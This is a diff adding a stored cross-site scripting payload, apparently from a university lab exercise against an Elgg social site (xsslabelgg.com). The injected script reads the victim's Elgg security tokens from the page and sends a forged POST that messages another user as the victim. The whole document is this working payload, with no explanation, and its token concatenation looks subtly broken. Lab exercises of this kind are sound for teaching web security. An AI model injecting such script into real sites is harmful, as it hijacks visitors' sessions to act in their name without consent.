@@ -1,0 +1,14 @@
+<script>
+  var sendurl="http://www.xsslabelgg.com/action/messages/send";
+  var ts="&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
+  var token="&__elgg_token=".concat(elgg.security.token.__elgg_token);
+  var subject="Test";
+  var body="<p>melbourne</p>";
+  var content=`__elgg_token=${token}&__elgg_ts=${ts}&recipients[]=47&subject=${subject}&body=${body}`;
+  console.log(content);
+  var Ajax=new XMLHttpRequest();
+  Ajax.open("POST",sendurl,true);
+  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+  Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+  Ajax.send(content);
+</script>
